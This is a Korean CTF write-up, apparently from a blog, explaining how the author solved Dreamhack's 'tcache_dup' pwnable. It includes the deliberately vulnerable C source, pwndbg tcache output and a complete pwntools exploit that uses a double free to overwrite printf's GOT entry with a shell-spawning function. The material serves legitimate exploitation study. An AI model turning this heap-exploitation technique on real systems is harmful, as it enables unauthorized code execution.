---
published: true
image: /img
layout: post
title: "[Dreamhack] PWN tcache_dup"
excerpt: "드림핵 포너블 tcache_dup 문제풀이"
tags: [Dreamhack, pwnable, ctf, writeup]
math: true
date: 2023-02-26 19:00
---

드림핵 tcache_dup 문제풀이다. 해당 문제 페이지를 보면 다음과 같은 tcache_dup 취약점에 대한 설명이 나와있다. [https://learn.dreamhack.io/16#82](https://learn.dreamhack.io/16#82)

tcache는 더블프리 버그같은 취약점을 검증하지 않아 여러 bin에서의 공격이 쉬운편이다. tcache dup 취약점은 double free 버그를 이용하여 힙이 할당될 때 같은 공간에 두번 할당 할 수 있다. 또한 값을 쓸 수 있다면 이 영역의 값을 변조하는 것도 가능하다. 

이 바이너리의 경우 printf 함수의 got영역에 get_shell()함수의 주소를 입력해 printf가 실행되면 쉘 획득이 가능하게 문제를 풀었다.

해당 바이너리의 소스코드는 다음과 같다.

```c
// gcc -o tcache_dup tcache_dup.c -no-pie
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

char *ptr[10];

void alarm_handler() {
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

int create(int cnt) {
    int size;

    if(cnt > 10) {
        return -1; 
    }
    printf("Size: ");
    scanf("%d", &size);

    ptr[cnt] = malloc(size);

    if(!ptr[cnt]) {
        return -1;
    }

    printf("Data: ");
    read(0, ptr[cnt], size);
}

int delete() {
    int idx;

    printf("idx: ");
    scanf("%d", &idx);

    if(idx > 10) {
        return -1; 
    }

    free(ptr[idx]);
}

void get_shell() {
    system("/bin/sh");
}

int main() {
    int idx;
    int cnt = 0;

    initialize();

    while(1) {
        printf("1. Create\n");
        printf("2. Delete\n");
        printf("> ");
        scanf("%d", &idx);

        switch(idx) {
            case 1:
                create(cnt);
                cnt++;
                break;
            case 2:
                delete();
                break;
            default:
                break;
        }
    }

    return 0;
}
```

64비트 환경에서 got값을 덮을 예정이기에 1번을 입력해 8바이트 메모리를 할당 받는다. 할당받은 메모리의 포인터는 ptr배열에 저장되어 0번은 우리가 할당받은 8바이트 메모리를 가리킨다. 이후 0번 포인터를 2번 메뉴를 통해 2번 free한다. 이후 tcache 정보를 보면 다음과 같다.

```c
pwndbg> tcache
{
  counts = "\002", '\000' <repeats 62 times>,
  entries = {0x1114260, 0x0 <repeats 63 times>},
}
```
tcache_entry에 다음에 할당될 힙 주소인 0x1114260가 있고 이는 2번 free한 주소이다. 이후 1번을 통해서 8바이트를 할당한 후 데이터에 printf got를 넣는다. double free가 일어나 다음에 할당될 주소가 printf got가 들어갈 것이다 pwndbg의 bins 명령을 통해 tcache bins 정보를 불어오면 다음과 같다.

```c
pwndbg> bins
pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.
This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.

tcachebins
0x20 [  1]: 0x13b5260 —▸ 0x601038 (printf@got[plt]) ◂— ...
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty
```

프로세스를 끝낸 뒤 다시 실행해 힙 주소는 다르지만 tcache에 예약된 청크를 보면 원래 할당된 메모리 뒤로 printf got가 할당된 것을 볼 수 있다. 따라서 이후 8바이트를 두번 할당 받을 것인데, 첫번째는 0x13b5260 주소의 메모리 위치가, 두번째는 printf got메모리 위치가 할당 될 것이다.

따라서 1번을 통해 8바이트 할당 후 임의 데이터를 입력한 뒤 또 1번을 통해 8바이트를 할당받아 get_shell() 함수 주소를 넣으면 printf got에 get_shell() 함수 주소가 쓰여 printf가 호출될때 쉘을 획득할 수 있다.

익스플로잇 코드는 다음과 같다.
```python
from pwn import *
context.update(arch='amd64', os='linux')

#p = remote("host3.dreamhack.games", 20376);
p = process("./tcache_dup", env={'LD_PRELOAD':'./libc-2.27.so'})
#p = process("./house_of_spirit")
libc=ELF('./libc-2.27.so')

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ", str(8))
p.sendafter(b"Data: ", b"A"*8)

p.sendlineafter("> ", b"2")
p.sendlineafter(b"idx: ", b"0")
p.sendlineafter("> ", b"2")
p.sendlineafter(b"idx: ", b"0")

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ", str(8))
p.sendafter(b"Data: ", p64(0x601038)) #printf got

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ", str(8))
p.sendlineafter(b"Data: ", b"A"*8)


p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"Size: ", str(8))
p.sendlineafter(b"Data: ", p64(0x400ab0)) #get_shell()

p.interactive()
```